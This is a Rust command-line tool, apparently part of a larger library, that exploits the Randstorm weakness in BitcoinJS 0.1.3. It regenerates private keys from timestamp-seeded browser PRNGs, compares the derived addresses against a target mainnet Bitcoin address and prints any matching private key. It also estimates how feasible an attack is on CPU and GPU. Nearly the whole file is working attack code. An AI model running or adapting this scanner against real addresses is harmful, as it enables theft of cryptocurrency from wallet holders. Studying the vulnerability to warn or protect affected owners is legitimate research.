//! Randstorm Scanner - Corrected Implementation
//! Based on temporal_planetarium_lib PRNG implementations
//! 
//! Vulnerability: BitcoinJS 0.1.3 (2011-2015) used weak browser PRNGs
//! for entropy generation, making private keys predictable.

use bitcoin::secp256k1::{Secp256k1, All, SecretKey};
use bitcoin::{Address, PublicKey, Network};
use rayon::prelude::*;
use std::env;
use std::time::Instant;
use std::io::{self, Write};
use std::fs::OpenOptions;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

// Импорты из temporal_planetarium_lib
use temporal_planetarium_lib::scans::randstorm::prng::{
    MathRandomEngine, WeakMathRandom, BitcoinJsV013Prng
};

// ============================================================================
// BROWSER ENGINE DEFINITIONS
// ============================================================================

#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum BrowserEngine {
    ChromeV8,      // MWC1616 - Chrome 14-45 (2011-2015)
    FirefoxSM,     // Java LCG - Firefox 4-40 (2011-2015)
    SafariJSC,     // WebKit LCG - Safari (2011-2015)
    IEChakra,      // Java LCG - IE 9-11 (2011-2016)
    SafariWindows, // MSVC CRT - Safari Windows 4-5 (2009-2012)
}

impl BrowserEngine {
    pub fn from_str(s: &str) -> Option<Self> {
        match s.to_lowercase().as_str() {
            "chrome" | "chrome_v8" | "v8" => Some(BrowserEngine::ChromeV8),
            "firefox" | "firefox_sm" | "sm" => Some(BrowserEngine::FirefoxSM),
            "safari" | "safari_jsc" | "jsc" => Some(BrowserEngine::SafariJSC),
            "ie" | "ie_chakra" | "chakra" => Some(BrowserEngine::IEChakra),
            "safari_windows" | "safari_win" => Some(BrowserEngine::SafariWindows),
            _ => None,
        }
    }
    
    pub fn to_math_random_engine(&self) -> MathRandomEngine {
        match self {
            BrowserEngine::ChromeV8 => MathRandomEngine::V8Mwc1616,
            BrowserEngine::FirefoxSM => MathRandomEngine::SpiderMonkeyLcg,
            BrowserEngine::SafariJSC => MathRandomEngine::Jsc,
            BrowserEngine::IEChakra => MathRandomEngine::IeChakraLcg,
            BrowserEngine::SafariWindows => MathRandomEngine::SafariWindowsCrt,
        }
    }
    
    pub fn market_share_2011_2015(&self) -> f32 {
        match self {
            BrowserEngine::ChromeV8 => 38.0,
            BrowserEngine::FirefoxSM => 19.0,
            BrowserEngine::SafariJSC => 9.0,
            BrowserEngine::IEChakra => 28.0,
            BrowserEngine::SafariWindows => 3.0,
        }
    }
    
    pub fn all() -> Vec<Self> {
        vec![
            BrowserEngine::ChromeV8,
            BrowserEngine::FirefoxSM,
            BrowserEngine::SafariJSC,
            BrowserEngine::IEChakra,
            BrowserEngine::SafariWindows,
        ]
    }
}

// ============================================================================
// CONFIGURATION
// ============================================================================

#[derive(Debug, Clone)]
struct ScanConfig {
    start_timestamp: u64,
    end_timestamp: u64,
    num_threads: usize,
    output_file: Option<String>,
    browser_engines: Vec<BrowserEngine>,
    target_address: Option<String>,
    first_tx_timestamp: Option<u64>,
    window_hours: u64,
    verbose: bool,
    network: Network,
}

impl ScanConfig {
    fn from_args(args: &[String]) -> Result<Self, String> {
        let mut config = ScanConfig::default();
        
        let mut i = 1;
        while i < args.len() {
            match args[i].as_str() {
                "-start" => {
                    if i + 1 < args.len() {
                        config.start_timestamp = args[i + 1].parse::<u64>()
                            .map_err(|_| "Invalid start timestamp".to_string())?;
                        i += 2;
                    }
                }
                "-end" => {
                    if i + 1 < args.len() {
                        config.end_timestamp = args[i + 1].parse::<u64>()
                            .map_err(|_| "Invalid end timestamp".to_string())?;
                        i += 2;
                    }
                }
                "-threads" => {
                    if i + 1 < args.len() {
                        config.num_threads = args[i + 1].parse::<usize>()
                            .unwrap_or_else(|_| rayon::current_num_threads());
                        i += 2;
                    }
                }
                "-browsers" => {
                    if i + 1 < args.len() {
                        config.browser_engines = args[i + 1].split(',')
                            .filter_map(|s| BrowserEngine::from_str(s.trim()))
                            .collect();
                        i += 2;
                    }
                }
                "-out" => {
                    if i + 1 < args.len() {
                        config.output_file = Some(args[i + 1].clone());
                        i += 2;
                    }
                }
                "-address" => {
                    if i + 1 < args.len() {
                        config.target_address = Some(args[i + 1].clone());
                        i += 2;
                    }
                }
                "-first-tx" => {
                    if i + 1 < args.len() {
                        config.first_tx_timestamp = Some(args[i + 1].parse::<u64>()
                            .map_err(|_| "Invalid first transaction timestamp".to_string())?);
                        i += 2;
                    }
                }
                "-window" => {
                    if i + 1 < args.len() {
                        config.window_hours = args[i + 1].parse::<u64>()
                            .map_err(|_| "Invalid window hours".to_string())?;
                        i += 2;
                    }
                }
                "-verbose" | "-v" => {
                    config.verbose = true;
                    i += 1;
                }
                "-quiet" | "-q" => {
                    config.verbose = false;
                    i += 1;
                }
                "-network" => {
                    if i + 1 < args.len() {
                        config.network = match args[i + 1].to_lowercase().as_str() {
                            "mainnet" => Network::Bitcoin,
                            "testnet" => Network::Testnet,
                            _ => return Err("Invalid network (use mainnet or testnet)".to_string()),
                        };
                        i += 2;
                    }
                }
                _ => i += 1,
            }
        }
        
        // Установка браузеров по умолчанию
        if config.browser_engines.is_empty() {
            config.browser_engines = BrowserEngine::all();
        }
        
        Ok(config)
    }
}

impl Default for ScanConfig {
    fn default() -> Self {
        ScanConfig {
            start_timestamp: 0,
            end_timestamp: 0,
            num_threads: rayon::current_num_threads(),
            output_file: None,
            browser_engines: BrowserEngine::all(),
            target_address: None,
            first_tx_timestamp: None,
            window_hours: 24,
            verbose: false,
            network: Network::Bitcoin,
        }
    }
}

// ============================================================================
// WALLET DERIVATION
// ============================================================================

#[derive(Debug, Clone)]
struct KeyResult {
    timestamp: u64,
    browser: BrowserEngine,
    private_key_hex: String,
    address_p2pkh: String,
}

/// Генерация приватного ключа используя правильную реализацию BitcoinJS 0.1.3
fn derive_wallet(
    timestamp_ms: u64,
    browser: BrowserEngine,
    secp: &Secp256k1<All>,
    network: Network,
) -> Option<KeyResult> {
    let engine = browser.to_math_random_engine();
    
    // ПРАВИЛЬНАЯ ГЕНЕРАЦИЯ через BitcoinJsV013Prng
    let privkey_bytes = BitcoinJsV013Prng::generate_privkey_bytes(
        timestamp_ms,
        engine,
        None, // Fingerprint seed - в базовой атаке не используется
    );
    
    // Проверка валидности приватного ключа
    let secret_key = match SecretKey::from_slice(&privkey_bytes) {
        Ok(sk) => sk,
        Err(_) => return None, // Невалидный ключ, пропускаем
    };
    
    // Генерация публичного ключа
    let public_key = PublicKey {
        compressed: false, // BitcoinJS 0.1.3 использовал uncompressed ключи
        inner: secp256k1::PublicKey::from_secret_key(secp, &secret_key),
    };
    
    // Генерация P2PKH адреса
    let address = Address::p2pkh(&public_key, network);
    
    Some(KeyResult {
        timestamp: timestamp_ms,
        browser,
        private_key_hex: hex::encode(privkey_bytes),
        address_p2pkh: address.to_string(),
    })
}

// ============================================================================
// MAIN SCANNING LOGIC
// ============================================================================

fn run_scan(config: &ScanConfig) {
    // Расчет временного окна
    let window_ms = config.window_hours * 60 * 60 * 1000;
    
    let (actual_start, actual_end) = if let Some(first_tx) = config.first_tx_timestamp {
        // Центрируем окно вокруг первой транзакции
        let start = first_tx.saturating_sub(window_ms / 2);
        let end = first_tx.saturating_add(window_ms / 2);
        (start, end)
    } else if config.start_timestamp > 0 && config.end_timestamp > 0 {
        // Используем явно указанные границы
        (config.start_timestamp, config.end_timestamp)
    } else {
        eprintln!("Error: Must specify either -start/-end or -first-tx");
        return;
    };
    
    let timestamps: Vec<u64> = (actual_start..=actual_end).collect();
    let total_timestamps = timestamps.len();
    
    let total_combinations = (total_timestamps as u64) * (config.browser_engines.len() as u64);
    
    // Информационный вывод только если verbose
    if config.verbose {
        eprintln!("Randstorm Scanner - Corrected Implementation");
        eprintln!("============================================");
        eprintln!("Time window: {} to {}", actual_start, actual_end);
        eprintln!("  Duration: {} ms ({:.1} hours)", 
            total_timestamps, 
            total_timestamps as f64 / (60.0 * 60.0 * 1000.0));
        eprintln!("Browsers: {} engines", config.browser_engines.len());
        for browser in &config.browser_engines {
            eprintln!("  - {:?} (market share: {:.1}%)", browser, browser.market_share_2011_2015());
        }
        eprintln!("Total combinations: {}", total_combinations);
        eprintln!("Threads: {}", config.num_threads);
        eprintln!("Network: {:?}", config.network);
        if let Some(ref addr) = config.target_address {
            eprintln!("Target address: {}", addr);
        }
        eprintln!();
    }
    
    // Инициализация Secp256k1 контекстов (по одному на поток)
    let secp_pool: Vec<Secp256k1<All>> = (0..config.num_threads)
        .map(|_| Secp256k1::new())
        .collect();
    
    // Настройка вывода
    let writer: Box<dyn Write + Send> = match &config.output_file {
        Some(filename) => {
            let file = OpenOptions::new()
                .create(true)
                .write(true)
                .truncate(true)
                .open(filename)
                .expect("Failed to create output file");
            Box::new(io::BufWriter::new(file))
        }
        None => Box::new(io::stdout()),
    };
    let writer = Arc::new(std::sync::Mutex::new(writer));
    
    // Атомарные счетчики
    let keys_generated = Arc::new(AtomicU64::new(0));
    let keys_matched = Arc::new(AtomicU64::new(0));
    let timestamps_processed = Arc::new(AtomicU64::new(0));
    
    let start_time = Instant::now();
    
    // Параллельная обработка
    timestamps.par_chunks(100).enumerate().for_each(|(chunk_idx, chunk)| {
        let thread_id = chunk_idx % secp_pool.len();
        let secp = &secp_pool[thread_id];
        
        for &timestamp in chunk {
            for &browser in &config.browser_engines {
                // Генерация кошелька
                if let Some(result) = derive_wallet(timestamp, browser, secp, config.network) {
                    keys_generated.fetch_add(1, Ordering::Relaxed);
                    
                    // Проверка на совпадение с целевым адресом
                    let is_match = if let Some(ref target) = config.target_address {
                        &result.address_p2pkh == target
                    } else {
                        false
                    };
                    
                    if is_match {
                        keys_matched.fetch_add(1, Ordering::Relaxed);
                        
                        // Вывод найденного ключа
                        let mut w = writer.lock().unwrap();
                        if config.verbose {
                            writeln!(w, "=== MATCH FOUND ===").ok();
                            writeln!(w, "Timestamp: {}", result.timestamp).ok();
                            writeln!(w, "Browser: {:?}", result.browser).ok();
                            writeln!(w, "Private Key: {}", result.private_key_hex).ok();
                            writeln!(w, "Address: {}", result.address_p2pkh).ok();
                            writeln!(w, "==================").ok();
                        } else {
                            writeln!(w, "{}", result.private_key_hex).ok();
                        }
                        w.flush().ok();
                        
                        if config.verbose {
                            eprintln!("\n🎯 MATCH FOUND!");
                            eprintln!("Address: {}", result.address_p2pkh);
                            eprintln!("Private Key: {}", result.private_key_hex);
                            eprintln!();
                        }
                    } else if config.verbose || config.target_address.is_none() {
                        // Вывод всех ключей если нет таргета или включен verbose
                        let mut w = writer.lock().unwrap();
                        writeln!(w, "{}", result.private_key_hex).ok();
                    }
                }
            }
            
            timestamps_processed.fetch_add(1, Ordering::Relaxed);
        }
        
        // Прогресс каждые 10 чанков (только в verbose режиме)
        if config.verbose && chunk_idx % 10 == 0 {
            let processed = timestamps_processed.load(Ordering::Relaxed);
            let generated = keys_generated.load(Ordering::Relaxed);
            let matched = keys_matched.load(Ordering::Relaxed);
            let elapsed = start_time.elapsed().as_secs_f64();
            let rate = if elapsed > 0.0 { generated as f64 / elapsed } else { 0.0 };
            
            let progress = (processed as f64 / total_timestamps as f64 * 100.0) as u32;
            
            eprint!("\rProgress: {}% | TS: {}/{} | Keys: {} | Matched: {} | Rate: {:.0}/s   ",
                progress, processed, total_timestamps, generated, matched, rate);
            io::stderr().flush().ok();
        }
    });
    
    let elapsed = start_time.elapsed();
    let total_keys = keys_generated.load(Ordering::Relaxed);
    let total_matched = keys_matched.load(Ordering::Relaxed);
    
    if config.verbose {
        eprintln!("\n\n=== Scan Complete ===");
        eprintln!("Time elapsed: {:.2?}", elapsed);
        eprintln!("Keys generated: {}", total_keys);
        eprintln!("Keys matched: {}", total_matched);
        eprintln!("Average rate: {:.0} keys/second", total_keys as f64 / elapsed.as_secs_f64());
    }
}

// ============================================================================
// ATTACK COMPLEXITY ESTIMATION
// ============================================================================

fn estimate_complexity(config: &ScanConfig) {
    let window_ms = config.window_hours * 60 * 60 * 1000;
    let browsers = config.browser_engines.len();
    
    let total_space = window_ms * (browsers as u64);
    
    eprintln!("Attack Complexity Estimation");
    eprintln!("============================");
    if let Some(ref addr) = config.target_address {
        eprintln!("Target: {}", addr);
    }
    eprintln!("Time window: {} hours", config.window_hours);
    eprintln!("Browsers: {}", browsers);
    for browser in &config.browser_engines {
        eprintln!("  - {:?}", browser);
    }
    eprintln!();
    eprintln!("Search space: {:.2e} combinations", total_space as f64);
    eprintln!();
    
    // Производительность на разных устройствах
    let cpu_single = 1_000.0; // ключей/сек на одном CPU
    let cpu_multi_16 = 16_000.0; // ключей/сек на 16-ядерном CPU
    let gpu_rtx3090 = 1_000_000.0; // ключей/сек на RTX 3090
    
    let time_cpu_single = (total_space as f64) / cpu_single;
    let time_cpu_multi = (total_space as f64) / cpu_multi_16;
    let time_gpu = (total_space as f64) / gpu_rtx3090;
    
    eprintln!("Estimated time:");
    eprintln!("  Single CPU core: {:.1} hours ({:.1} days)", 
        time_cpu_single / 3600.0, time_cpu_single / 86400.0);
    eprintln!("  16-core CPU: {:.1} hours ({:.1} days)", 
        time_cpu_multi / 3600.0, time_cpu_multi / 86400.0);
    eprintln!("  RTX 3090 GPU: {:.1} hours ({:.1} days)", 
        time_gpu / 3600.0, time_gpu / 86400.0);
    eprintln!();
    
    if time_gpu < 24.0 * 3600.0 {
        eprintln!("Status: ✅ HIGHLY FEASIBLE (< 24 hours on GPU)");
    } else if time_gpu < 7.0 * 24.0 * 3600.0 {
        eprintln!("Status: ⚠️  FEASIBLE (< 1 week on GPU)");
    } else if time_cpu_multi < 30.0 * 24.0 * 3600.0 {
        eprintln!("Status: ⚠️  POSSIBLE (< 1 month on multi-core CPU)");
    } else {
        eprintln!("Status: ❌ INFEASIBLE with current parameters");
        eprintln!("Recommendation: Reduce time window or use more specific targeting");
    }
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

fn print_usage() {
    println!("Randstorm Scanner - Corrected Implementation");
    println!("Based on BitcoinJS 0.1.3 vulnerability (2011-2015)");
    println!();
    println!("Usage: randstorm_scanner [OPTIONS]");
    println!();
    println!("Time Window Options (choose one):");
    println!("  -start <ms> -end <ms>     Explicit timestamp range");
    println!("  -first-tx <ms>            Center window around first transaction");
    println!("                            (use with -window to set window size)");
    println!();
    println!("Options:");
    println!("  -window <hours>           Time window size (default: 24 hours)");
    println!("  -browsers <list>          Comma-separated browser list");
    println!("                            Options: chrome, firefox, safari, ie, safari_windows");
    println!("                            Default: all browsers");
    println!("  -threads N                Number of threads (default: CPU cores)");
    println!("  -address <addr>           Target Bitcoin address (search mode)");
    println!("  -network <net>            Network: mainnet or testnet (default: mainnet)");
    println!("  -out <filename>           Output results to file");
    println!("  -verbose, -v              Verbose output (progress, statistics)");
    println!("  -quiet, -q                Quiet mode - only output hex keys (default)");
    println!("  -estimate                 Estimate complexity without scanning");
    println!();
    println!("Examples:");
    println!();
    println!("  # Scan specific time range (all browsers)");
    println!("  randstorm_scanner -start 1395038931000 -end 1395038932000");
    println!();
    println!("  # Target specific address with ±24h window");
    println!("  randstorm_scanner -address 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa \\");
    println!("                    -first-tx 1395038931000 -window 24");
    println!();
    println!("  # Only Chrome browser, ±6h window");
    println!("  randstorm_scanner -first-tx 1395038931000 -window 6 -browsers chrome");
    println!();
    println!("  # Estimate complexity");
    println!("  randstorm_scanner -first-tx 1395038931000 -window 24 -estimate");
    println!();
    println!("Notes:");
    println!("  - Timestamps are in milliseconds since Unix epoch");
    println!("  - BitcoinJS 0.1.3 used uncompressed public keys");
    println!("  - This targets the exact vulnerability from Randstorm disclosure");
}

// ============================================================================
// MAIN FUNCTION
// ============================================================================

fn main() {
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 2 || args.contains(&"-help".to_string()) || args.contains(&"--help".to_string()) {
        print_usage();
        return;
    }
    
    let config = match ScanConfig::from_args(&args) {
        Ok(config) => config,
        Err(e) => {
            eprintln!("Error: {}", e);
            eprintln!();
            print_usage();
            return;
        }
    };
    
    // Режим оценки сложности
    if args.contains(&"-estimate".to_string()) {
        estimate_complexity(&config);
        return;
    }
    
    // Проверка параметров сканирования
    if config.start_timestamp == 0 && config.end_timestamp == 0 && config.first_tx_timestamp.is_none() {
        eprintln!("Error: Must specify time range using -start/-end or -first-tx");
        eprintln!();
        print_usage();
        return;
    }
    
    // Настройка пула потоков
    if config.num_threads != rayon::current_num_threads() {
        let _ = rayon::ThreadPoolBuilder::new()
            .num_threads(config.num_threads)
            .build_global();
    }
    
    // Запуск сканирования
    run_scan(&config);
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_browser_engine_conversion() {
        let chrome = BrowserEngine::ChromeV8;
        assert_eq!(chrome.to_math_random_engine(), MathRandomEngine::V8Mwc1616);
        
        let firefox = BrowserEngine::FirefoxSM;
        assert_eq!(firefox.to_math_random_engine(), MathRandomEngine::SpiderMonkeyLcg);
    }
    
    #[test]
    fn test_wallet_derivation_deterministic() {
        let secp = Secp256k1::new();
        let timestamp = 1389781850000u64;
        
        let result1 = derive_wallet(timestamp, BrowserEngine::ChromeV8, &secp, Network::Bitcoin);
        let result2 = derive_wallet(timestamp, BrowserEngine::ChromeV8, &secp, Network::Bitcoin);
        
        assert!(result1.is_some());
        assert!(result2.is_some());
        
        let r1 = result1.unwrap();
        let r2 = result2.unwrap();
        
        assert_eq!(r1.private_key_hex, r2.private_key_hex);
        assert_eq!(r1.address_p2pkh, r2.address_p2pkh);
    }
    
    #[test]
    fn test_known_vector() {
        // Тест с известным вектором из v8.rs
        let secp = Secp256k1::new();
        let timestamp = 1389781850000u64;
        
        let result = derive_wallet(timestamp, BrowserEngine::ChromeV8, &secp, Network::Bitcoin);
        assert!(result.is_some());
        
        let r = result.unwrap();
        // Ожидаемый ключ из теста test_v8_reference_historical_parity
        let expected_hex = "8459259a725f3e05f777dd419c65d816ab58ea1978132a09779f9cad70cf44b7";
        assert_eq!(r.private_key_hex, expected_hex);
    }
}